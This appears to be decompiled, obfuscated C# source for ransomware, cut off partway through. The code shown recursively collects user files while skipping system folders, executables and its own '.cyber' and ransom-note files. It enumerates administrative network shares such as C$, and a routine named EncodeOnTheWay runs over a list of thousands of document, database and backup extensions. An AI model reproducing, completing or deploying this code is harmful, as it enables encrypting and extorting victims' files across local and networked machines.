using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IlvDzAreHadiwY;
using Microsoft.Win32;
using aHIHEJJDItp;
using uBNEFMEMmU;

namespace vQzMGKHeycFziMq;

internal class yzZnBHwSsJOOcf
{
	public class DdKEOZcPpbrjT
	{
		private static StringCollection LKqYtqqRXaR = new StringCollection();

		private static List<string> lmGnRwxLTkE = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(jLGThbkXlozfB("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("Инструкция") && !text.EndsWith(".cyber") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(jMMJJGmjJwKTlH))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(mdaIzrMUGsBhh) * 1024.0 * 1024.0 && CWUUcxmowiDg == "YES")
							{
								lmGnRwxLTkE.Add(text);
							}
							else if (File.Exists(text) && CWUUcxmowiDg == "NO")
							{
								lmGnRwxLTkE.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return lmGnRwxLTkE;
		}
	}

	[CompilerGenerated]
	private sealed class WQjlofoAFR
	{
		public string QPVswSqKSwkM;

		public bool _003CMain_003Eb__7(Process p)
		{
			return p.ProcessName == QPVswSqKSwkM;
		}
	}

	[CompilerGenerated]
	private sealed class ZQzBnScKjE
	{
		public string[] wYdUGPCdlHxOyfY;

		public void _003CMain_003Eb__8()
		{
			xkRzQgTOxjz.ZiKybVjpMkSxOel(wYdUGPCdlHxOyfY);
		}
	}

	[CompilerGenerated]
	private sealed class QChlRqxIOAMaMcs
	{
		public string lBuKciWArtM;

		public void _003CMapDrv_003Eb__1e(int g)
		{
			Thread.Sleep(PXrJUxZGiZRJBh);
			lZNmNTLNdP.Add("\\\\" + lBuKciWArtM + "\\" + (char)g + "$");
			try
			{
				if (MFBaFacYIYTeS)
				{
					Console.WriteLine("\\\\" + lBuKciWArtM + "\\" + (char)g + "$");
				}
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private sealed class wxxKCRWYlpYOJl
	{
		public string NOYqDnYIDaRU;

		public bool _003CIsDriveNTFS_003Eb__23(DriveInfo d)
		{
			return d.RootDirectory.Name == NOYqDnYIDaRU;
		}
	}

	[CompilerGenerated]
	private sealed class qoxrhzLJHLD
	{
		public string xpQWqSDoME;

		public void _003CEncodeOnTheWay_003Eb__26()
		{
			arKJyakwbrEs(xpQWqSDoME, new string[4822]
			{
				"$$$", "$db", "$efs", "$er", "^^^", "__a", "__b", "{pb", "~cw", "~hm",
				"0", "000", "001", "1", "101", "103", "108", "110", "113", "123",
				"128", "17t", "1CD", "1pe", "1ph", "1sp", "1st", "2", "2mg", "2Q0",
				"2QM", "3", "3d", "3d4", "3dd", "3df", "3df8", "3dm", "3dmdef", "3dp",
				"3dr", "3ds", "3dt", "3dw", "3dxml", "3fr", "3g2", "3ga", "3gp", "3gp2",
				"3me", "3MF", "3mm", "3pe", "3pr", "3w", "4dd", "4dl", "4dv", "4fs",
				"4w7", "5vw", "602", "73b", "73c", "73l", "7z", "7z001", "7z002", "7zip",
				"8", "86f", "89t", "89y", "8ba", "8bc", "8be", "8bf", "8bi8", "8bl",
				"8bs", "8bx", "8by", "8li", "8svx", "8xg", "8xk", "8xs", "8xt", "8xv",
				"9xt", "9xy", "a$v", "a00", "a01", "a02", "a2c", "a5l", "a5w", "a65",
				"aa", "aa3", "aac", "aaf", "aah", "aam", "aao", "aaui", "ab", "ab1",
				"ab3", "ab4", "ab65", "aba", "abbu", "abc", "abcd", "abf", "abi", "abk",
				"abkprj", "abp", "abt", "abw", "aby", "ac2", "ac3", "ac5", "aca", "acc",
				"accdb", "accdc", "accde", "accdr", "accdt", "accft", "ACCTB", "ace", "acf", "acg",
				"ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings", "acrodata", "acroplugin", "acrypt", "act",
				"acz", "ad", "ada", "adb", "adc", "adcp", "add", "addism", "ade", "adf",
				"adi", "adif", "adoc", "ados", "adox", "adp", "adpb", "adr", "ads", "adt",
				"adu", "adv", "advs", "adx", "adz", "aea", "aec", "aep", "aepx", "aes",
				"aet", "afd", "afdesign", "afe", "aff", "afi", "afm", "afp", "aft", "agd",
				"agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec", "age3xsav", "age3xscn", "age3yrec", "age3ysav",
				"age3yscn", "aggr", "ahf", "ai", "aif", "aifb", "aiff", "aim", "ain", "AIO",
				"aip", "ais", "ait", "ak", "al", "al8", "ala", "alb3", "alb4", "alb5",
				"alb6", "alc", "ald", "aldf", "alf", "ali", "allet", "alt3", "alt5", "alz",
				"AM", "amb", "amc", "amf", "aml", "amm", "amr", "amsorm", "amt", "amu",
				"amx", "amxx", "an1", "an8", "anime", "anl", "anme", "ann", "ans", "ansr",
				"ansym", "anx", "aoi", "ap", "apa", "apalbum", "apd", "ape", "apf", "aph",
				"api", "apj", "apk", "aplibrary", "apnx", "apo", "app", "APPCACHE", "approj", "APPX",
				"apr", "apt", "apw", "apxl", "apz", "ar", "arc", "arch00", "archiver", "arduboy",
				"arff", "ari", "arj", "arn", "aro", "arr", "ars", "art", "arw", "as",
				"as$", "as3", "asa", "asc", "ascm", "ascx", "asd", "ase", "asf", "ashbak",
				"ashdisc", "ashprj", "ashx", "ask", "asl", "asm", "asmx", "asn", "asnd", "asp",
				"aspx", "asr", "asset", "ast", "asv", "asvx", "asx", "atf", "ath", "atl",
				"atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux", "av", "avc", "avhd", "avhdx",
				"avj", "avl", "avn", "avp", "avs", "AW", "awb", "awbr", "awd", "awdb",
				"awe", "awg", "awp", "aws", "awt", "aww", "awwp", "ax", "azf", "azs",
				"azw", "azw1", "azw3", "azw4", "azz", "azzx", "b", "b1", "b27", "b2a",
				"b5i", "b5t", "b64", "b6i", "b6t", "b6z", "ba", "ba6", "ba7", "ba8",
				"ba9", "bac", "back", "backup", "backupdb", "bad", "bafl", "bak", "bak~", "bak2",
				"bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj", "bau", "bax", "bay", "bbb",
				"bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz", "bc", "bc5", "bc6", "bc7",
				"bcc", "bcd", "bci", "bck", "bckp", "bcl", "bcm", "bcp", "bct", "bdb",
				"bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp", "bdr", "bdt2", "bdt3", "bean",
				"bed", "bfa", "bff", "bfx", "bgl", "bgt", "bgv", "bh", "bho", "bi8",
				"bib", "bibtex", "bic", "bif", "bifx", "big", "bik", "bil", "bim", "bin",
				"bina", "binary", "bionix", "BIT", "bizdocument", "bjl", "bjo", "bk", "bk!", "bk1",
				"bk2", "bk3", "bk4", "bk5", "bk6", "bk7", "bk8", "bk9", "bkc", "bkf",
				"bkg", "bkp", "bks", "bkup", "bkz", "blb", "bld", "blend", "blend1", "blend2",
				"blg", "blk", "blm", "bln", "blob", "blockplt", "blogthis", "blp", "bluebutton", "bm2",
				"bm3", "bmc", "bmf", "bmk", "bml", "bmm", "bmml", "bmpr", "bms", "bna",
				"bndl", "bnk", "boc", "bok", "boo", "book", "bookexport", "bop", "box", "bp1",
				"bp2", "bp3", "bpa", "bpb", "bpd", "bpdx", "bpf", "bphys", "bpj", "bpk",
				"bpl", "bplx", "bpm", "bpmc", "bpn", "bps", "bpw", "brain", "brd", "breaking_bad",
				"brf", "brh", "brl", "brn", "BROWSER", "brs", "brw", "brx", "bsa", "bsd",
				"bsdl", "bsk", "bso", "bsp", "bst", "btd", "btf", "btif", "btinstall", "BTL",
				"btm", "btoa", "btr", "btx", "BUD", "bul", "bundle", "bup", "burn", "burntheme",
				"bvd", "bvp", "bwa", "bwd", "bwf", "bwi", "bwp", "bws", "bwt", "bwz",
				"BXF", "bxx", "bz", "bz2", "bza", "bzabw", "bzip", "bzip2", "c", "c00",
				"c01", "c02", "c10", "c2e", "c3d", "c4p", "c6", "cadoc", "cae", "caf",
				"cag", "calca", "cam", "camm", "camproj", "cap", "capt", "capx", "car", "caro",
				"cas", "cat", "catproduct", "cav", "cawr", "cb7", "cba", "cbf", "cbg", "cbmap",
				"cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc", "cca", "ccc", "ccd",
				"ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd", "cd1", "cd2", "cdb",
				"cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl", "cdm", "cdml", "cdmm",
				"cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5", "cdr6", "cdrw", "cds",
				"cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef", "cel", "celtx", "cenon~",
				"cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd", "cfg", "cfp", "cfr",
				"cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp", "chg", "chi", "chk",
				"chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht", "chtml", "cib", "cida",
				"cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9", "ckp", "ckt", "cl2",
				"cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist", "clb", "cld", "clg",
				"clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk", "clkv", "clm", "clp",
				"clr", "cls", "clx", "cm10", "cm5", "cma", "cmap", "CMB", "cmbl", "cmf",
				"cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna", "cnf", "cng", "cnt",
				"cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS", "compositionmodel", "compositiontemplate", "con",
				"conf", "config", "contact", "converterx", "cp", "cp9", "CPA", "cpaa", "cpc", "cpd",
				"cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk", "cpmz", "cpp", "cpt",
				"cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb", "crd", "crds", "creole",
				"crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr", "crtx", "crw", "crwl",
				"cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall", "cryptra", "cs", "cs8",
				"csa", "csd", "cse", "CSG", "csh", "csi", "csl", "csm", "cso", "csp",
				"csr", "css", "cst", "csv", "ctb", "ctbl", "ctd", "cte", "ctf", "CTG",
				"ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3", "ctx", "ctxt", "cty",
				"cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva", "cvd", "cvj", "cvl",
				"cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr", "cws", "cww", "cwwp",
				"cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi", "cyo", "cys", "czi",
				"czip", "czp", "d", "d00", "d01", "d3dbsp", "d64", "d88", "da0", "da2",
				"daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf", "dag", "dal", "dam",
				"dao", "dap", "dar", "das", "daschema", "dash", "dat", "DATA", "database", "datx",
				"dax", "dayzprofile", "dazip", "db", "db_journal", "db0", "db3", "dba", "dbb", "dbc",
				"dbcrypt12", "dbcrypt8", "dbd", "dbf", "DBF", "dbfv", "dbgsym", "db-journal", "dbk", "dbr",
				"dbs", "db-shm", "dbt", "dbv", "db-wal", "dbx", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "epf",
				"EPF", "epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub",
				"epw", "eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err",
				"ersx", "es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm",
				"esp", "esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt",
				"ets", "ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p",
				"ev3s", "evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc",
				"exd", "exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez",
				"ezc", "ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90",
				"f96", "fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta",
				"fax", "fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw",
				"fcd", "fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct",
				"fd", "fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds",
				"fdseq", "fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff",
				"ffa", "ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx",
				"fg3", "fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin",
				"fingnet", "fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg",
				"flib", "flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp",
				"fls", "flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat",
				"fmc", "fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk",
				"fnf", "fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol",
				"folio", "folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3",
				"fp4", "fp5", "fp7", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk",
				"fplinkbar", "fpp", "fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag",
				"frameset", "frd", "frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs",
				"fsa", "fsc", "fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10",
				"ft11", "ft7", "ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw",
				"ful", "fwbackup", "fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo",
				"fxp", "fxr", "fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m",
				"g41", "ga3", "gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1",
				"gb2", "gbi", "gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca",
				"gcd", "gcg", "gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable",
				"gdc", "gdf", "GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom",
				"gen", "genbank", "geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs",
				"gfx", "ggb", "ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh",
				"gla", "gld", "glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl",
				"gml", "gmp", "gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3",
				"gp4", "gpd", "gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan",
				"gpx", "gpz", "gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey",
				"grf", "grib", "grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr",
				"grs", "grt", "grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet",
				"gslides", "gsm", "GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp",
				"gts", "gui", "guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl",
				"gxt", "gz", "gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11",
				"h12", "h13", "h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o",
				"h2w", "h3m", "h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml",
				"hbk", "hbl", "hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr",
				"hcu", "hcw", "hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl",
				"hdpmx", "hds", "hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex",
				"hfd", "hfs", "hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb",
				"HKF", "hkx", "hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3",
				"hml", "hmskin", "hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2",
				"hpd", "hpj", "hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx",
				"hs", "hs2", "hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg",
				"htm", "htm~", "html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc",
				"HVE", "hvpl", "hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN",
				"hxq", "hxr", "hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02",
				"i5z", "iab", "iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb",
				"ibcd", "ibd", "ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo",
				"icbu", "icc", "icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics",
				"icst", "icxs", "id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml",
				"idp", "idx", "ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff",
				"ifiction", "ifm", "ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr",
				"ihf", "ihp", "ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg",
				"ilogicvb", "ima", "image", "imd", "img", "imp", "imr", "imt", "imz", "in",
				"INBOX", "INC", "incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp",
				"indt", "inf", "info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins",
				"inss", "installhelper", "insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias",
				"ipd", "ipf", "iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock",
				"irp", "irr", "irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso",
				"ispc", "ispx", "ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm",
				"itmsp", "itmz", "itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc",
				"ivd", "ivs", "ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj",
				"iwtpl", "iwxdata", "ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar",
				"jasper", "jav", "java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr",
				"jc", "jclic", "JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif",
				"JFM", "jgcscs", "jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp",
				"jnb", "jnt", "joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg",
				"jpf", "jpg", "jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint",
				"JRS", "jrxml", "js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx",
				"jtbackup", "jtd", "jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww",
				"k25", "k3b", "kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2",
				"kdb", "kdbx", "kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi",
				"kexic", "kexis", "key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp",
				"kgtemp", "kid", "kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno",
				"knt", "kos", "kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd",
				"ksm", "ksp", "kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp",
				"l", "l01", "l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat",
				"latex", "lav", "lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx",
				"lcb", "lcd", "lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldf",
				"ldif", "lef", "lev", "lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf",
				"lgh", "lgi", "lgl", "lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life",
				"lin", "list", "lit", "litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb",
				"llv", "llx", "LM", "lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt",
				"lnx", "LO_", "loc", "localstorage", "log", "LOG1", "logonxp", "lok", "lot", "lp",
				"lp2", "lp7", "lpa", "lpc", "lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd",
				"lpp", "lpx", "lqm", "lrcat", "lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit",
				"ls3", "ls5", "lsa", "lsd", "lsf", "lsl", "lsp", "lsr", "lst", "lsu",
				"ltcx", "ltm", "ltr", "LTS", "ltx", "lua", "lud", "lut", "lutx", "lvd",
				"lvivt", "lvl", "lvm", "lvw", "lw4", "lwd", "lwo", "lwp", "lwx", "lx01",
				"lxf", "lxk", "ly", "lyt", "lyx", "m", "m13", "m14", "m2", "m2ts",
				"m3u", "m3u8", "m4a", "m4p", "m4u", "m4v", "m7p", "maca", "maf", "mag",
				"mai", "maker", "maml", "man", "manu", "map", "mapimail", "MAPSTYLE", "maq", "mar",
				"marc", "markdn", "mars", "marshal", "mas", "mass", "mat", "mav", "max", "maxfr",
				"maxm", "mba", "mbbk", "mbd", "mbf", "mbg", "mbi", "mbox", "mbp", "mbx",
				"mc1", "mc9", "mcat", "mcd", "mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp",
				"mcrp", "mcw", "mcx", "md", "md0", "md1", "md2", "md3", "md5", "md8",
				"mdb", "mdbackup", "mdbhtml", "mdc", "mdccache", "mdd", "mddata", "mdf", "mdg", "mdi",
				"mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn", "mds", "mdsx", "MDT", "mdx",
				"MDZ", "mecontact", "med", "mef", "meg", "mega", "meh", "mell", "mellel", "mem",
				"menc", "menu", "meo", "merlin2", "met", "METADATA", "metadata_never_index", "mex", "mf", "mf4",
				"mfa", "mfe", "mfl", "mfo", "mfp", "mft", "mfu", "mfv", "mfw", "mga",
				"mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht", "mhtenx", "mhtmlenx", "mi", "mic",
				"mid", "mif", "mim", "mime", "mindnode", "miniso", "mip", "mission", "mix", "mjd",
				"mjdoc", "mjk", "mkd", "mke", "mkv", "mla", "mlb", "mlc", "mlj", "mlm",
				"mls", "mlsxml", "mlx", "mm", "mm6", "mm7", "mm8", "mmap", "mmc", "mmd",
				"mme", "mmf", "mmjs", "mml", "mmm", "mmo", "mmp", "mmsw", "mmw", "mnc",
				"mng", "MNI", "mnk", "mno", "mny", "mo", "mobi", "mod", "MODEL", "MOF",
				"moho", "mol", "money", "moneywell", "mos", "mosaic", "mov", "movie", "mox", "moz",
				"mp1", "mp2", "mp4v", "mpa", "mpd", "mpe", "mpeg", "mpf", "mpg", "mph",
				"mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge", "mpr", "mps", "mpt", "mpv",
				"mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg", "mru", "mrw", "mrwref", "ms",
				"ms10", "msb", "msc", "msct", "msd", "mse", "msf", "msg", "mshc", "msie",
				"msim", "msl", "mso", "msor", "msp", "msq", "mss", "ms-tnef", "msw", "mswd",
				"mtdd", "mte", "mtf", "mtff", "mth", "MTL", "mtm", "mtml", "mto", "mtp",
				"mts", "mtw", "mtx", "mtxt", "mud", "mug", "mui", "mum", "mup", "mvd",
				"mvdx", "mvex", "mvm", "mw", "mwb", "mwd", "mwf", "mwii", "mwpd", "mwpp",
				"mws", "mwx", "mx", "mxad", "mxc2", "mxd", "mxg", "mxi", "mxl", "mxp",
				"myd", "mydocs", "myi", "myo", "mz", "n3", "nam", "names", "nap", "narrative",
				"nas", "nav", "navmap", "nb", "nb7", "nba", "nbak", "nbd", "nbe", "nbf",
				"nbi", "nbk", "nbp", "nbs", "nbu", "nc", "ncd", "ncf", "nco", "ncorx",
				"nct", "nd", "nda", "ndb", "ndd", "ndf", "ndif", "ndk", "ndl", "ndr",
				"nds", "ndx", "ne1", "ne3", "nef", "nessus", "net", "neta", "netspd", "netspm",
				"NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs", "nfs11save", "ng", "NGR",
				"nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP", "NLT", "nma", "nmbtemplate",
				"nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni", "NNM", "nnp", "nnt",
				"nokogiri", "nop", "not", "note", "notebook", "now", "noy", "np", "npd", "npdf",
